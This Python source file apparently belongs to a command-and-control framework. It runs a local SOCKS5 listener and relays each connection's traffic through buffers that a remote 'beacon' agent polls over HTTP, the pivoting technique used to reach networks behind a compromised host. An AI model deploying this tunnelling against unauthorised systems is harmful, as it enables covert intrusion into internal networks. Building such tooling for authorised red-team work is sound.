"""
SOCKS5 proxy tunnelled over HTTP beacon polling.
Architecture:
  - Operator connects to local SOCKS5 port (default 1080)
  - For each TCP connection, a TunnelChannel is created with a unique ID
  - The beacon polls /api/beacon/tunnel/tick, gets data to forward and sends back data
  - socks5_server bridges between local SOCKS5 client and the remote beacon
"""
import socket
import threading
import struct
import time
import uuid
from typing import Optional

# ── Channel registry ──────────────────────────────────────────────────────────

class TunnelChannel:
    def __init__(self, channel_id: str, target_host: str, target_port: int):
        self.id          = channel_id
        self.target_host = target_host
        self.target_port = target_port
        self.active      = True
        self.to_beacon   = b""   # data to send to beacon (from local client)
        self.from_beacon = b""   # data received from beacon (to local client)
        self.lock        = threading.Lock()
        self._local_sock: Optional[socket.socket] = None  # SOCKS5 client socket

    def write_to_beacon(self, data: bytes):
        with self.lock:
            self.to_beacon += data

    def read_for_beacon(self) -> bytes:
        with self.lock:
            data = self.to_beacon
            self.to_beacon = b""
            return data

    def write_from_beacon(self, data: bytes):
        with self.lock:
            self.from_beacon += data

    def read_for_client(self) -> bytes:
        with self.lock:
            data = self.from_beacon
            self.from_beacon = b""
            return data


# Global channel registry {channel_id: TunnelChannel}
_channels: dict[str, TunnelChannel] = {}
_channels_lock = threading.Lock()

# Active agent target (set when operator starts SOCKS5 proxy)
_current_agent_id: Optional[str] = None


def get_channel(channel_id: str) -> Optional[TunnelChannel]:
    with _channels_lock:
        return _channels.get(channel_id)


def create_channel(target_host: str, target_port: int, agent_id: str) -> TunnelChannel:
    cid = str(uuid.uuid4())
    ch  = TunnelChannel(cid, target_host, target_port)
    with _channels_lock:
        _channels[cid] = ch
    return ch


def remove_channel(channel_id: str):
    with _channels_lock:
        ch = _channels.pop(channel_id, None)
    if ch:
        ch.active = False


def list_channels() -> list[dict]:
    with _channels_lock:
        return [
            {"id": c.id, "target": f"{c.target_host}:{c.target_port}", "active": c.active}
            for c in _channels.values()
            if c.active
        ]


def get_pending_opens(agent_id: str) -> list[dict]:
    """Return channels that need to be opened on the beacon side."""
    with _channels_lock:
        return [
            {"id": c.id, "host": c.target_host, "port": c.target_port}
            for c in _channels.values()
            if c.active and c._local_sock is not None and getattr(c, '_open_sent', False) is False
        ]


# ── SOCKS5 handshake helpers ──────────────────────────────────────────────────

def _recv_exact(sock: socket.socket, n: int) -> bytes:
    buf = b""
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            raise ConnectionError("socket closed")
        buf += chunk
    return buf


def _socks5_handshake(sock: socket.socket) -> tuple[str, int]:
    """Perform SOCKS5 handshake, return (target_host, target_port)."""
    # Greeting
    ver, nmethods = _recv_exact(sock, 2)
    _recv_exact(sock, nmethods)  # methods
    sock.sendall(b"\x05\x00")    # no auth

    # Request
    ver, cmd, rsv, atyp = _recv_exact(sock, 4)
    if cmd != 1:  # only CONNECT
        sock.sendall(b"\x05\x07\x00\x01" + b"\x00" * 6)
        raise ValueError(f"Unsupported SOCKS5 cmd {cmd}")

    if atyp == 1:   # IPv4
        host = socket.inet_ntoa(_recv_exact(sock, 4))
    elif atyp == 3: # domain
        dlen = _recv_exact(sock, 1)[0]
        host = _recv_exact(sock, dlen).decode()
    elif atyp == 4: # IPv6
        host = socket.inet_ntop(socket.AF_INET6, _recv_exact(sock, 16))
    else:
        raise ValueError(f"Unknown atyp {atyp}")

    port = struct.unpack(">H", _recv_exact(sock, 2))[0]

    # Reply: success (we reply optimistically; beacon confirms later)
    sock.sendall(b"\x05\x00\x00\x01" + b"\x00" * 4 + struct.pack(">H", port))

    return host, port


# ── Per-connection handler ────────────────────────────────────────────────────

def _handle_client(client_sock: socket.socket):
    try:
        host, port = _socks5_handshake(client_sock)
    except Exception:
        client_sock.close()
        return

    if _current_agent_id is None:
        client_sock.close()
        return

    ch = create_channel(host, port, _current_agent_id)
    ch._local_sock = client_sock
    ch._open_sent  = False  # beacon hasn't opened the connection yet
    client_sock.settimeout(0.05)

    try:
        while ch.active:
            # Read from local client → buffer for beacon
            try:
                data = client_sock.recv(4096)
                if not data:
                    break
                ch.write_to_beacon(data)
            except socket.timeout:
                pass
            except Exception:
                break

            # Write data from beacon → local client
            incoming = ch.read_for_client()
            if incoming:
                try:
                    client_sock.sendall(incoming)
                except Exception:
                    break

            time.sleep(0.02)
    finally:
        ch.active = False
        client_sock.close()
        remove_channel(ch.id)


# ── SOCKS5 listener ───────────────────────────────────────────────────────────

_server_sock: Optional[socket.socket] = None
_server_thread: Optional[threading.Thread] = None
_running = False


def start(agent_id: str, bind_host: str = "127.0.0.1", bind_port: int = 1080):
    global _server_sock, _server_thread, _running, _current_agent_id
    if _running:
        stop()

    _current_agent_id = agent_id
    _running = True

    _server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    _server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    _server_sock.bind((bind_host, bind_port))
    _server_sock.listen(32)
    _server_sock.settimeout(1.0)

    def _accept_loop():
        while _running:
            try:
                conn, _ = _server_sock.accept()
                t = threading.Thread(target=_handle_client, args=(conn,), daemon=True)
                t.start()
            except socket.timeout:
                continue
            except Exception:
                break

    _server_thread = threading.Thread(target=_accept_loop, daemon=True)
    _server_thread.start()


def stop():
    global _running, _server_sock, _current_agent_id
    _running = False
    _current_agent_id = None
    if _server_sock:
        try:
            _server_sock.close()
        except Exception:
            pass
        _server_sock = None
    # Close all channels
    with _channels_lock:
        for ch in _channels.values():
            ch.active = False
        _channels.clear()


def is_running() -> bool:
    return _running


def current_port() -> Optional[int]:
    if _server_sock:
        try:
            return _server_sock.getsockname()[1]
        except Exception:
            pass
    return None
